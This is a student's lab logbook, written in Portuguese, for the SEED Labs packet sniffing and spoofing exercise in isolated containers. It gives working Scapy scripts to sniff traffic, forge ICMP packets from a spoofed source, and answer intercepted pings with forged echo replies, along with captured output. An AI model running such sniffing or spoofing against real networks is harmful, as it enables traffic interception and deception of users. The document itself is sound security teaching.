# SEED Labs – Packet Sniffing and Spoofing Lab

## Environment Setup using Container

Interface name: `br-280fbeef7772`

```sh
[12/27/24]seed@VM:~/.../Labsetup$ dockps
e9ea0f6cf10d  seed-attacker
822ed3579024  hostA-10.9.0.5
22e1fa4b1be9  hostB-10.9.0.6
[12/27/24]seed@VM:~/.../Labsetup$ docksh e9
root@VM:/# ifconfig
br-280fbeef7772: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.9.0.1  netmask 255.255.255.0  broadcast 10.9.0.255
        inet6 fe80::42:abff:fe13:3e74  prefixlen 64  scopeid 0x20<link>
        ether 02:42:ab:13:3e:74  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 42  bytes 5080 (5.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
(...)
```

## Lab Task Set 1: Using Scapy to Sniff and Spoof Packets

### Task 1.1: Sniffing Packets

Alterou-se o valor de `iface` no código exemplo para o nome da interface encontrado acima.

- sniffer.py 

```python
#!/usr/bin/env python3
from scapy.all import *

def print_pkt(pkt):
    pkt.show()

pkt = sniff(iface='br-280fbeef7772', filter='icmp', prn=print_pkt)
```

#### Task 1.1A

- Attacker (10.9.0.1)

Ao correr o programa **com** privilégios root, foi possível sniffar e filtrar pacotes ICMP (`filter='icmp'`), por exemplo, ping requests and replies.

```
root@VM:/volumes# chmod a+x sniffer.py 
root@VM:/volumes# sniffer.py 
###[ Ethernet ]### 
  dst       = 02:42:0a:09:00:06
  src       = 02:42:0a:09:00:05
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 84
     id        = 8626
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = 0x4db
     src       = 10.9.0.5
     dst       = 10.9.0.6
     \options   \
###[ ICMP ]### 
        type      = echo-request
        code      = 0
        chksum    = 0x9333
        id        = 0x1d
        seq       = 0x1
###[ Raw ]### 
           load      = '\xbd\xa0ng\x00\x00\x00\x00s\xd3\x06\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'

###[ Ethernet ]### 
  dst       = 02:42:0a:09:00:05
  src       = 02:42:0a:09:00:06
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 84
     id        = 11601
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = 0x393c
     src       = 10.9.0.6
     dst       = 10.9.0.5
     \options   \
###[ ICMP ]### 
        type      = echo-reply
        code      = 0
        chksum    = 0x9b33
        id        = 0x1d
        seq       = 0x1
###[ Raw ]### 
           load      = '\xbd\xa0ng\x00\x00\x00\x00s\xd3\x06\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'
```

Estes 2 pacotes capturados representam um pedido ICMP (echo-request) e uma resposta ICMP (echo-reply), que fazem parte de uma troca de pacotes durante um comando ping.  
O `primeiro pacote` foi enviado pelo hostA (10.9.0.5) para o hostB (10.9.0.6), solicitando uma resposta. Segue uma explicação das várias camadas. 

`Camada Ethernet:`  

- `dst = 02:42:0a:09:00:06`: Endereço MAC de destino. É o endereço físico do dispositivo na rede que receberá este pacote.
- `src = 02:42:0a:09:00:05`: Endereço MAC de origem. É o endereço físico do dispositivo que enviou o pacote.
- `type = IPv4`: Indica que o payload do pacote Ethernet contém um pacote IPv4.

`Camada IP:`

- `src = 10.9.0.5`: Endereço IP de origem (host que enviou o pedido).
- `dst = 10.9.0.6`: Endereço IP de destino (host para o qual o pedido foi enviado).
- `proto = icmp`: Indica que o protocolo usado no pacote é ICMP.
- `len = 84`: Comprimento total do pacote IP (em bytes).
- `id = 8626`: Identificador único para este pacote IP.
- `flags = DF`: "Don't Fragment" (indica que o pacote não deve ser fragmentado).
- `ttl = 64`: Time To Live, o número de saltos (hops) que o pacote pode fazer antes de ser descartado.

`Camada ICMP:`

- `type = echo-request`: Tipo de mensagem ICMP, indicando um pedido de eco (ping).
- `id = 0x1d`: Identificador do pacote ICMP (geralmente usado para diferenciar múltiplas requisições ICMP).
- `seq = 0x1`: Número de sequência, usado para rastrear a ordem dos pacotes ICMP.
- `chksum = 0x9333`: Checksum para verificar a integridade do pacote ICMP.

`Camada Raw:`

- Contém 56 bytes de dados aleatórios, incluindo caracteres ASCII e valores hexadecimais. Estes dados são usados para calcular o tempo de ida e volta (RTT) e podem ser personalizados no comando ping.  

O `segundo pacote` foi enviado pelo hostB (10.9.0.6) para o hostA (10.9.0.5), como resposta ao pedido anterior. A explicação das várias camadas é idêntica à anterior, sendo possível destacar na camada ICMP `type = echo-reply`.

- Host A (10.9.0.5)

Os containers hostA e hostB não enviam pacotes por defeito. Para exemplificar esta tarefa, enviou-se pacotes de dentro de cada container. Neste caso, executou-se o comando `ping 10.9.0.6` no hostA.

```sh
[12/27/24]seed@VM:~/.../Labsetup$ dockps
e9ea0f6cf10d  seed-attacker
822ed3579024  hostA-10.9.0.5
22e1fa4b1be9  hostB-10.9.0.6
[12/27/24]seed@VM:~/.../Labsetup$ docksh 82
root@822ed3579024:/# ping 10.9.0.6
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=1.93 ms
64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.402 ms
64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.284 ms
64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.279 ms
64 bytes from 10.9.0.6: icmp_seq=5 ttl=64 time=0.333 ms
64 bytes from 10.9.0.6: icmp_seq=6 ttl=64 time=0.264 ms
64 bytes from 10.9.0.6: icmp_seq=7 ttl=64 time=0.277 ms
^C
--- 10.9.0.6 ping statistics ---
7 packets transmitted, 7 received, 0% packet loss, time 6103ms
rtt min/avg/max/mdev = 0.264/0.538/1.933/0.570 ms
```

No entanto, ao tentar correr o programa **sem** privilégios root, esta operação não é permitida ("Operation not permitted"). Tal como era esperado, para  sniffar pacotes é necessário correr o programa com privilégios root.

```sh
root@VM:/volumes# su seed
seed@VM:/volumes$ sniffer.py 
Traceback (most recent call last):
  File "./sniffer.py", line 7, in <module>
    pkt = sniff(iface='br-280fbeef7772', filter='icmp', prn=print_pkt)
  File "/usr/local/lib/python3.8/dist-packages/scapy/sendrecv.py", line 1036, in sniff
    sniffer._run(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/scapy/sendrecv.py", line 906, in _run
    sniff_sockets[L2socket(type=ETH_P_ALL, iface=iface,
  File "/usr/local/lib/python3.8/dist-packages/scapy/arch/linux.py", line 398, in __init__
    self.ins = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))  # noqa: E501
  File "/usr/lib/python3.8/socket.py", line 231, in __init__
    _socket.socket.__init__(self, family, type, proto, fileno)
PermissionError: [Errno 1] Operation not permitted
```

#### Task 1.1B

- Capture only the ICMP packet

Na Task 1.1A já se utilizou a sintaxe necessária para este filtro BPF (`filter='icmp'`) e os comandos a executar para enviar os pacotes desejados (`ping`).


- Capture any TCP packet that comes from a particular IP and with a destination port number 23

Assumindo que o IP em específico seria `10.9.0.5` (o hostA por exemplo), o parâmetro `filter` da função `sniff` seria `filter='tcp and src host 10.9.0.5 and dst port 23'` 

`tcp`: Captura apenas pacotes TCP.  
`src host 10.9.0.5`: Filtra os pacotes cuja origem é o IP fornecido.  
`dst port 23`: Filtra os pacotes cujo destino é a porta 23 (Telnet).

```python
#!/usr/bin/env python3
from scapy.all import *

def print_pkt(pkt):
    pkt.show()

pkt = sniff(iface='br-280fbeef7772', filter='tcp and src host 10.9.0.5 and dst port 23', prn=print_pkt)
```

Para demonstrar este filtro, executou-se o seguinte comando a partir do container hostA:

```sh
root@822ed3579024:/# echo "Hello, teste ao segundo filtro" > /dev/tcp/10.9.0.6/23
```

`/dev/tcp/10.9.0.6/23`: Representa uma conexão TCP para o endereço 10.9.0.6 (hostB) na porta 23.  
`echo "Hello, teste ao segundo filtro"`: Envia a string como o conteúdo do pacote.  
`>`: Redireciona o conteúdo do echo para a conexão TCP.

Assim, no container attacker é possível sniffar o pacote que contém o payload da mensagem que foi enviada (entre outros pacotes relacionados com a comunicação TCP).

```
###[ Ethernet ]### 
  dst       = 02:42:0a:09:00:06
  src       = 02:42:0a:09:00:05
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 83
     id        = 7089
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = 0xad8
     src       = 10.9.0.5
     dst       = 10.9.0.6
     \options   \
###[ TCP ]### 
        sport     = 50028
        dport     = telnet
        seq       = 2531417703
        ack       = 1808904494
        dataofs   = 8
        reserved  = 0
        flags     = PA
        window    = 502
        chksum    = 0x1462
        urgptr    = 0
        options   = [('NOP', None), ('NOP', None), ('Timestamp', (2704977750, 3400825599))]
###[ Raw ]### 
           load      = 'Hello, teste ao segundo filtro\n'
```

- Capture packets comes from or to go to a particular subnet

Escolhendo a subnet `128.230.0.0/16`, o parâmetro `filter` da função `sniff` seria `filter='net 128.230.0.0/16'`, assim é possível capturar pacotes que vêm de qualquer endereço IP na subnet 128.230.0.0/16 ou que têm como destino algum endereço nessa subnet.  

```python
#!/usr/bin/env python3
from scapy.all import *

def print_pkt(pkt):
    pkt.show()

pkt = sniff(iface='br-280fbeef7772', filter='net 128.230.0.0/16', prn=print_pkt)
```

Para demonstrar este filtro, uma forma possível é executar o comando `ping 128.230.0.1`.

### Task 1.2: Spoofing ICMP Packets

Para atingir o objetivo desta task, alterou-se o atributo `dst` do código fornecido para `10.9.0.6` (hostB) e acrescentou-se o atributo `src` com valor `10.9.0.5` (hostA). A explicação do código já se encontra no guião, daí ser aqui omitida.

- icmp_spoof.py 

```python
#!/usr/bin/env python3
from scapy.all import *

a = IP()
a.dst = '10.9.0.6'
a.src = '10.9.0.5'
b = ICMP()
p = a/b
send(p)
```

Depois de correr o programa, observou-se no `Wireshark` que o nosso ICMP echo request foi aceite pelo `dst` (hostB) e este enviou um pacote ICMP echo reply para o `src` (hostA/spoofed IP address).

![](./images/logbook13_1.png)

### Task 1.3: Traceroute

Optou-se por realizar esta task de forma automática e para isso implementou-se a função `trace_route` adaptando o código fornecido. A principal diferença é a utilização da função `sr1()` - "Sends packets at Layer 3 and waits for the first answer".

- Fonte: SEED book (15.5.7 Sending and Receiving Packets)

O output desta função é a resposta que é enviada, sendo possível descobrir se o nosso pacote chegou ao destino através do atributo `type` que será `11` ou `0` no caso de uma `ICMP error message` ou `echo reply` respetivamente. 

- traceroute.py 

```python 
#!/usr/bin/env python3
from scapy.all import *

def trace_route(destination, max_hops=30):
    print(f"Tracing route to {destination} with a maximum of {max_hops} hops.\n")
    
    for ttl in range(1, max_hops + 1):
        a = IP()
        a.dst = destination
        a.ttl = ttl 
        b = ICMP()
        reply = sr1(a/b, verbose=0, timeout=2)
        
        if reply is None:
            print(f"{ttl}: * (Request timed out)")
        elif reply.type == 11:  
            print(f"{ttl}: {reply.src} (Time-to-live exceeded)")
        elif reply.type == 0:
            print(f"{ttl}: {reply.src} (Destination reached)")
            break
    else:
        print(f"Maximum hops reached ({max_hops}). The destination might be unreachable.")

trace_route("8.8.8.8")
```

O output foi:

```sh
root@VM:/volumes# traceroute.py
Tracing route to 8.8.8.8 with a maximum of 30 hops.

1: 10.0.2.2 (Time-to-live exceeded)
2: 192.168.1.1 (Time-to-live exceeded)
3: 77.54.64.3 (Time-to-live exceeded)
4: 83.174.50.26 (Time-to-live exceeded)
5: 142.250.161.172 (Time-to-live exceeded)
6: 192.178.248.175 (Time-to-live exceeded)
7: 192.178.82.14 (Time-to-live exceeded)
8: 142.250.237.83 (Time-to-live exceeded)
9: 142.251.55.147 (Time-to-live exceeded)
10: 142.250.59.19 (Time-to-live exceeded)
11: 142.250.214.43 (Time-to-live exceeded)
12: 8.8.8.8 (Destination reached)
```

Como era esperado, este resultado é semelhante ao mesmo utilizando a ferramenta `traceroute`.

```sh
[12/27/24]seed@VM:.../Labsetup$ traceroute 8.8.8.8 -I
traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
 1  _gateway (10.0.2.2)  0.342 ms  0.417 ms  0.363 ms
 2  vodafonegw (192.168.1.1)  3.012 ms  2.976 ms  2.943 ms
 3  3.64.54.77.rev.vodafone.pt (77.54.64.3)  7.795 ms  8.148 ms  8.121 ms
 4  26.50.174.83.rev.vodafone.pt (83.174.50.26)  11.946 ms  12.238 ms  12.210 ms
 5  142.250.161.172 (142.250.161.172)  12.180 ms  12.140 ms  12.852 ms
 6  192.178.248.175 (192.178.248.175)  12.055 ms  11.272 ms  11.447 ms
 7  192.178.82.14 (192.178.82.14)  11.413 ms  10.643 ms  11.354 ms
 8  142.250.237.83 (142.250.237.83)  12.183 ms  12.350 ms  12.301 ms
 9  142.251.55.147 (142.251.55.147)  23.013 ms  22.946 ms  23.249 ms
10  142.250.59.19 (142.250.59.19)  22.862 ms  22.808 ms  23.116 ms
11  142.250.214.43 (142.250.214.43)  21.616 ms  21.514 ms  20.822 ms
12  dns.google (8.8.8.8)  21.361 ms  21.457 ms  20.546 ms
```

### Task 1.4: Sniffing and-then Spoofing

Para executar este ataque desenvolveu-se um script (sniff_spoof_icmp.py) que conjuga o código das 2 técnicas exploradas nas tasks anteriores.  
Em primeiro lugar, estamos a sniffar (`sniff()`) e filtrar ICMP (`filter='icmp'`) echo requests (`pkt[ICMP].type == 8`) - "If the type of the ICMP packet is echo request (the type value is 8), the program will immediately send out a spoofed ICMP echo reply."

Fonte: SEED book (15.5.6 Sniffing and Then Spoofing)

Os pacotes capturados são processados pela `spoof_pkt()`, onde é criado um pacote ICMP Echo Reply (`type=0`) spoofed com IP de origem e destino trocados, mesmo ID, sequência e payload do pacote original. No final esse pacote é enviado de volta ao remetente.

- sniff_spoof_icmp.py

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        print("Original Packet.........")
        print("Source IP : ", pkt[IP].src)
        print("Destination IP :", pkt[IP].dst)

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load
        newpkt = ip/icmp/data

        print("Spoofed Packet ...... ...")
        print("Source IP : ", newpkt[IP].src)
        print("Destination IP :", newpkt[IP].dst)
        send(newpkt, verbose=0)

pkt = sniff(iface='br-280fbeef7772', filter='icmp', prn=spoof_pkt)
```

Segue a análise aos resultados dos 3 testes:

- `ping 1.2.3.4 # a non-existing host on the Internet`

```sh
root@822ed3579024:/# ping 1.2.3.4
PING 1.2.3.4 (1.2.3.4) 56(84) bytes of data.
64 bytes from 1.2.3.4: icmp_seq=1 ttl=64 time=77.9 ms
64 bytes from 1.2.3.4: icmp_seq=2 ttl=64 time=22.6 ms
64 bytes from 1.2.3.4: icmp_seq=3 ttl=64 time=25.0 ms
64 bytes from 1.2.3.4: icmp_seq=4 ttl=64 time=21.8 ms
64 bytes from 1.2.3.4: icmp_seq=5 ttl=64 time=25.3 ms
^C
--- 1.2.3.4 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4008ms
rtt min/avg/max/mdev = 21.789/34.501/77.886/21.734 ms
```

```sh
root@VM:/volumes# sniff_spoof_icmp.py 
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 1.2.3.4
Spoofed Packet ...... ...
Source IP :  1.2.3.4
Destination IP : 10.9.0.5
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 1.2.3.4
Spoofed Packet ...... ...
Source IP :  1.2.3.4
Destination IP : 10.9.0.5
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 1.2.3.4
```

**Resultado**: `0% packet loss` (ataque com sucesso)  
A route da máquina do utilizador (hostA) até ao IP 1.2.3.4 (inexistente) era a seguinte:
```sh
root@822ed3579024:/# ip route get 1.2.3.4
1.2.3.4 via 10.9.0.1 dev eth0 src 10.9.0.5 uid 0 
    cache 
```
Isso significa que os pacotes enviados pelo hostA antes de chegar à Internet, eles passam primeiro pelo 10.9.0.1 - a máquina do atacante. De facto, ao observar os logs do Wireshark, notou-se que foi enviado um broadcast packet para obter o endereço MAC da máquina do atacante.

![](./images/logbook13_2.png)


- `ping 10.9.0.99 # a non-existing host on the LAN`

```sh
root@822ed3579024:/# ping 10.9.0.99
PING 10.9.0.99 (10.9.0.99) 56(84) bytes of data.
From 10.9.0.5 icmp_seq=1 Destination Host Unreachable
From 10.9.0.5 icmp_seq=2 Destination Host Unreachable
From 10.9.0.5 icmp_seq=3 Destination Host Unreachable
^C
--- 10.9.0.99 ping statistics ---
6 packets transmitted, 0 received, +3 errors, 100% packet loss, time 5111ms
pipe 4
```

**Resultado**: `100% packet loss` (ataque sem sucesso)  
A route da máquina do utilizador (hostA) até ao IP 10.9.0.99 (inexistente na LAN) era a seguinte:
```sh
root@822ed3579024:/# ip route get 10.9.0.99
10.9.0.99 dev eth0 src 10.9.0.5 uid 0 
    cache 
```
Quando ping é executado, a máquina do utilizador (10.9.0.5) envia pacotes ICMP Echo Request para o destino (10.9.0.99). Contudo, antes dos pacotes serem enviados, o sistema precisa de resolver o endereço IP 10.9.0.99 (obter endereço MAC), usando o protocolo ARP. Se o IP 10.9.0.99 não existir (que é o caso), nenhum host responderá ao pedido ARP, logo sem um endereço MAC para enviar os pacotes, o ping não consegue enviar os pacotes ICMP e o ataque não tem sucesso por consequência.

![](./images/logbook13_3.png)

- `ping 8.8.8.8 # an existing host on the Internet`

```sh
root@822ed3579024:/# ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=254 time=27.7 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=64 time=88.5 ms (DUP!)
64 bytes from 8.8.8.8: icmp_seq=2 ttl=64 time=17.3 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=254 time=34.6 ms (DUP!)
64 bytes from 8.8.8.8: icmp_seq=3 ttl=64 time=21.1 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=254 time=35.6 ms (DUP!)
64 bytes from 8.8.8.8: icmp_seq=4 ttl=64 time=22.1 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=254 time=28.8 ms (DUP!)
^C
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, +4 duplicates, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 17.315/34.482/88.510/21.286 ms
```

```sh
root@VM:/volumes# sniff_spoof_icmp.py 
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 8.8.8.8
Spoofed Packet ...... ...
Source IP :  8.8.8.8
Destination IP : 10.9.0.5
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 8.8.8.8
Spoofed Packet ...... ...
Source IP :  8.8.8.8
Destination IP : 10.9.0.5
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 8.8.8.8
Spoofed Packet ...... ...
Source IP :  8.8.8.8
Destination IP : 10.9.0.5
Original Packet.........
Source IP :  10.9.0.5
Destination IP : 8.8.8.8
Spoofed Packet ...... ...
Source IP :  8.8.8.8
Destination IP : 10.9.0.5
```

**Resultado**: `0% packet loss` (ataque com sucesso, mas com duplicados - DUP!)  
A route da máquina do utilizador (hostA) até ao IP 8.8.8.8 (o servidor DNS público do Google) é a seguinte:
```sh
root@822ed3579024:/# ip route get 8.8.8.8  
8.8.8.8 via 10.9.0.1 dev eth0 src 10.9.0.5 uid 0 
    cache 
```
Muito semelhante ao primeiro teste, isto é, os pacotes enviados pelo hostA antes de chegar à Internet, eles passam primeiro pelo 10.9.0.1 - a máquina do atacante. A diferença está no resultado final, uma vez que não foi possível interceptar a resposta legítima de 8.8.8.8, esta chegou a 10.9.0.5, causando duplicados.

![](./images/logbook13_4.png)
